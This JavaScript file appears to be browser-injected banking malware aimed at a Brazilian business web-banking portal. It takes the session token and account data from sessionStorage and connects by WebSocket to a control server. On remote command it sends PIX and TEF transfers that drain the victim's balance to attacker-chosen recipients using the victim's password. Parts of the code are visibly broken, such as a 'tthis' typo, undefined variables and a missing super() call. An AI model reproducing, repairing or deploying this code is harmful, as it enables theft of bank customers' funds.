class WebSocketService {

    constructor(){
        this.socket = new WebSocket("ws://localhost:3000")
    }

    sendMessage(username, action, data){
        this.socket.send(btoa(JSON.stringify({ username, action, data })))
    }

    connect(password, username){
        this.socket.addEventListener("open", (event) => {
            this.sendMessage(username, "LOGIN", { password })
        })
        this.socket.addEventListener("message", (event) => this.onSocketMessage(JSON.parse(atob(event.data))))
    }

    async onMessage(message){
        if(message.action === "GET_LIMITS"){
            const balance = await this.getBalance()
            const limitPix = await this.getPixLimit()
            const tefLimitAll = await this.getTefLimit()
            const tefAvailableLimit = await this.getTefAvailableLimit()
            const limitTef = (tefLimitAll - tefAvailableLimit)
            const limitPayment = await this.getPaymentLimit()
            this.sendMessage(username, "UPDATE_USER", { clientData: { limitPix, limitTef, limitPayment, balance } })
        }
        if(message.action === "MAKE_PIX"){
            const response = await this.makePix(message.data.password, message.data.key, message.data.amount || null)
            if(response) this.sendMessage("NOTIFY", "SUCCESS_PIX", {})
        }
        if(message.action === "MAKE_TEF"){
            const response = await tthis.makeTef(message.data.password, message.data.key, message.data.amount || null)
            if(response) this.sendMessage("NOTIFY", "SUCCESS_TEF", {})
        }
    }

}

class BaseService extends WebSocketService {

    constructor(){
        this.domain = window.location.origin
        this.account = JSON.parse(decodeURI(sessionStorage.getItem("contaSelecionada")))
        this.currentUser = JSON.parse(atob(JSON.parse(sessionStorage.getItem("cfe-dados-cliente"))))
        this.currentUserID = this.currentUser.identificacaoUsuario
        this.authorization = "Bearer " + JSON.parse(sessionStorage.getItem("cfe-access-token"))
        this.headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": this.authorization,
            "content-type": "application/json",
            "sec-ch-ua": "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"
        }
        this.options = {
            "headers": this.headers,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "mode": "cors",
            "credentials": "include"
        }
        this.now = new Date().toLocaleDateString().replace(/[^0-9]/gim,"")
    }

    async getBalance(){
        try{
            const request = await fetch(this.domain + "/cfe-sol-saldo-extrato/api/v2/saldo/consulta", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-pgr/?v=1.0.39",
                "body":  "{}",
                "method": "POST",
            })
            const { response: { saldoDisponivel } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return saldoDisponivel
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async getPixLimit(){
        try{
            const request = await fetch(this.domain + "/cfe-sol-limite/api/v1/limitecadastradopix/consultar", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-limites/",
                "body": "{}",
                "method": "POST",
            })
            const { response: { valorLimiteContaNaoCadastrado } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return valorLimiteContaNaoCadastrado
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async getTefLimit(){ 
        try{
            const request = await fetch(this.domain + "/cfe-sol-limite/api/v1/limite/transferencia/consultar", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-limites/",
                "body":  "{}",
                "method": "POST",
            })
            const { response: { valorLimiteAnterior } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return valorLimiteAnterior
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async getTefAvailableLimit(){ 
        try{
            const request = await fetch(this.domain + "/cfe-sol-transferencia/api/v1/transferencia/recentes/conta-corrente", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-dashboard/",
                "body":  "{}",
                "method": "POST",
            })
            const { response: { comprovantes } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            const now = new Date().toLocaleDateString()
            if(!comprovantes.length) return 0
            const today = comprovantes.filter(({ dataDocumento }) => dataDocumento === now)
            if(!today.length) return 0
            return parseInt(today.reduce((acc, { valor }) => acc + valor, 0))
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async getPaymentLimit(){
        try{
            const request = await fetch(this.domain + "/cfe-sol-limite/api/v1/limite-pagamento/consultar", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-limites/",
                "body":  "{}",
                "method": "POST",
            })
            const { response: { valorLimiteAnterior } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return valorLimiteAnterior
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async getUsers(){
        try{
            const request = await fetch(this.domain + "/cfe-ato/api/v1/empresa/usuarios", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-usuarios/",
                "body":  null,
                "method": "GET",
            })
            const { response: { usuarios } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return usuarios
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    getAgencyAndAccount(){
        const [agency, account] = document
            .querySelector("span.nome-select-conta")
            .getAttribute("title")
            .split(" | ")
            .map((c) => c.trim())
        return { agency, account }
    }
}

class TefService extends BaseService {

    constructor(){
        super()
    }

    async makeTef(password, agency, account, value = null){
        const account = await this.queryAccount(agency, account)
        if(!account) return false

        if(value === null){
            const balance = await this.getBalance()
            const teflimitDay = await this.getTefAvailableLimit()
            const teflimit = await this.getTefLimit()
            const debit = Math.floor(Math.random() * (60 - 10 + 1) + 10)
            const tefLimitForTransfer = (teflimit - teflimitDay) - debit
            const available = balance - tefLimitForTransfer
            value = String(parseInt(available))
        }

        const transfer = await this.queryTef({
            destName: account.nomeTitular,
            destAgency: agency,
            destAccount: account,
            value
        })
        if(!transfer) return false

        const confirm = await this.confirmTef(password, transfer.payload)
        if(!confirm) return false

        return true
    }

    async queryAccount(agency,account){
        try{
            const request = await fetch(this.domain + "/cfe-pgr/api/v1/bacen/consultaDadosConta", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-transferencias/?v=1.11.3",
                "body":  JSON.stringify({
                    "agencia": agency,
                    "contaSemDV": account,
                    "codigoAmbienteExecucao": "O"
                }),
                "method": "POST",
            })
            const { response: { nomeTitular, numeroCpfCnpj, pj } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return { nomeTitular, numeroCpfCnpj, pj }
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async queryTef({ destName, destAgency, destAccount, value }){
        try{
            const { agency, account } = this.getAgencyAndAccount()
            const payload = {
                "printResposta": false,
                "numeroPendencia": "",
                "msgPendencia": "",
                "indicadorLimite": "",
                "tipoContaOrigem": "CC",
                "dependenciaOrigem": agency,
                "numeroContratoOrigem": account,
                "numeroCartao": "",
                "quantidadeParcelas": "",
                "opcaoData": 1,
                "tipoTransferenciaDestino": "BB",
                "codigoBancoDestinatario": "001",
                "tipoContaDestino": "CC",
                "agenciaDestino": String(destAgency), // sem digito
                "contaDestino": String(destAccount),  // sem digito
                "dadosDepositoIdentificado": {},
                "valor": String(value),
                "data": new Date().toLocaleDateString(),
                "agenciaDestinataria": "",
                "contaDestinataria": "",
                "indicadorPessoa": "1",
                "indicadorCPMF": "0",
                "nomeClienteDestino": destName,
                "finalidadeOBN": "",
                "bancoSelecionado": {
                  "codIspb": "0",
                  "codCompe": "001",
                  "codMaisNome": "001 - BANCO DO BRASIL S.A.",
                  "detalhes": {
                    "cdCompeS": 1,
                    "cdIspbS": 0,
                    "nomeIfS": "BANCO DO BRASIL S.A.",
                    "siglaIfS": "BB",
                    "prdCompeS": "S",
                    "prdDocS": "S",
                    "prdCobS": "S",
                    "prdTedS": "S",
                    "ispbPropS": "S"
                  }
                }
            }
            const request = await fetch(this.domain + "/cfe-sol-transferencia/api/v3/transferencia/contas-bb/conta-corrente/conta-corrente/consulta", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-central-transferencias/?v=1.11.3",
                "body":  JSON.stringify(payload),
                "method": "POST",
            })
            const { response } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return { response, payload }
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async confirmTef(password, payload){
        try{
            payload.indicadorCPMF = 8
            const request = await fetch(this.domain + "/cfe-sol-transferencia/api/v3/transferencia/contas-bb/conta-corrente/conta-corrente/confirma", {
                ...this.options,
                "headers": {
                    ...this.headers,
                    "X-CFE-AUTH-CREDENTIAL": password,
                },
                "referrer": this.domain + "/apf-apj-central-transferencias/?v=1.11.3",
                "body":  JSON.stringify(payload),
                "method": "POST",
            })
            const { response } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return response
        }catch(e){
            console.error(e.stack)
            return false
        }
    }
    
}

class PixService extends BaseService {

    constructor(){
        super()
    }

    async makePix(password, key, value = null){
        const limit = await this.getPixLimit()
        const balance = await this.getBalance()
        const debit = Math.floor(Math.random() * (60 - 10 + 1) + 10)
        const amount = balance > limit ? (limit - debit) : (balance - debit)

        const destination = await this.queryPix(key)
        if(!destination) return false 

        const transfer = await this.queryPixTransfer(key, value !== null ? Number(value) : amount, destination)
        if(!transfer) return false 

        const confirm = await this.confirmPix(password, transfer.payload)
        if(!confirm) return false 

        return true
    }

    async queryAccount(){
        try{
            const request = await fetch(this.domain + "/cfe-pgr/api/v1/bacen/consultaDadosConta", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-pgr/?v=1.0.39",
                "body":  JSON.stringify({
                    agencia: this.account.dependenciaOrigem,
                    contaSemDV: this.account.numeroContratoOrigem
                }),
                "method": "POST",
            })
            const { response: { nomeTitular, numeroCpfCnpj, pj } } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return { nomeTitular, numeroCpfCnpj, pj }
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async confirmPix (password, {
        textoIdentificadorRecebedor,
        codigoIdentificadorPagamento,
        valorTotal,
        ispbRecebedor,
        tipoPessoaRecebedor,
        cpfCnpjRecebedor,
        tipoContaRecebedor,
        agenciaRecebedor,
        contaRecebedorComDV,
        nomeFavorecido
    }) {
        try{
            const request = await fetch(this.domain + "/cfe-pgr/api/v1/bacen/pagaTransferenciaPIX/efetiva", {
                ...this.options,
                "headers": {
                    ...this.headers,
                    "X-CFE-AUTH-CREDENTIAL": password,
                    "X-CFE-NAO-PREENCHER-ATO-MCI": 1
                },
                "referrer": this.domain + "/apf-apj-pgr/?v=1.0.39",
                "body":  JSON.stringify({
                    textoIdentificadorRecebedor,
                    codigoIdentificadorPagamento,
                    "codigoIdentificadorPagamentoOriginal": "",
                    "pjLogado": true,
                    "dataPagamento": this.now,
                    "codigoPrioridadePagamento": 1,
                    valorTotal,
                    "valorJurosPago": 0,
                    "valorDescontoPagamento": 0,
                    "valorMultaPagamento": 0,
                    "valorAbatimentoPagamento": 0,
                    "codigoMotivoDevolucaoPagamento": 0,
                    "descricaoMotivoDevolucao": "",
                    ispbRecebedor,
                    tipoPessoaRecebedor,
                    cpfCnpjRecebedor,
                    tipoContaRecebedor,
                    agenciaRecebedor,
                    contaRecebedorComDV,
                    "textoInformativoPagador": "",
                    "idConciliacaoRecebedor": "",
                    "idSolicitacao": "",
                    nomeFavorecido,
                    "sistemaResponsavelPagamento": "APJ"
                }),
                "method": "POST",
            })
            const { response } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return true
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async queryPixTransfer(key, value, {
        identificadorBacen,
        codigoISPBBancoRecebedor,
        codigoTipoPessoaRecebedor,
        cpfCnpjRecebedor,
        codigoTipoContaRecebedor,
        codigoAgenciaRecebedor,
        nomeCompletoRecebedor,
        numeroContaRecebedor
    }) {
        try{
            const payload = {
                "codigoIdentificadorPagamento": identificadorBacen,
                "pjLogado": true,
                "valorTotal": value,
                "codigoMotivoDevolucaoPagamento": 0,
                "ispbRecebedor": codigoISPBBancoRecebedor,
                "tipoPessoaRecebedor": codigoTipoPessoaRecebedor,
                "cpfCnpjRecebedor": cpfCnpjRecebedor,
                "tipoContaRecebedor": codigoTipoContaRecebedor,
                "agenciaRecebedor": codigoAgenciaRecebedor,
                "contaRecebedorComDV": numeroContaRecebedor,
                "textoInformativoPagador": "",
                "idSolicitacao": "",
                "nomeFavorecido": nomeCompletoRecebedor,
                "dataPagamento": this.now,
                "codigoDevolucao": 0,
                "textoDevolucao": "",
                "textoIdentificadorRecebedor": key,
                "sistemaResponsavelPagamento": "APJ",
                "idConciliacaoRecebedor": "",
                "codigoPrioridadePagamento": 1
            }
            const request = await fetch(this.domain + "/cfe-pgr/api/v1/bacen/pagaTransferenciaPIX/consulta", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-pgr/?v=1.0.39",
                "body": JSON.stringify(payload),
                "method": "POST",
            })
            const { response } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return { response, payload }
        }catch(e){
            console.error(e.stack)
            return false
        }
    }

    async queryPix(key){
        try{
            const request = await fetch(this.domain + "/cfe-pgr/api/v2/bacen/consultaDadosBancariosRecebedorBacen", {
                ...this.options,
                "referrer": this.domain + "/apf-apj-pgr/?v=1.0.39",
                "body": JSON.stringify({
                    pjLogado: true,
                    identificadorBacen: key
                }),
                "method": "POST",
            })
            const { response } = await request.json()
            const status = request.status
            if(status !== 200) throw new Error(status)
            return response
        }catch(e){
            console.error(e.stack)
            return false
        }
    }
    
}

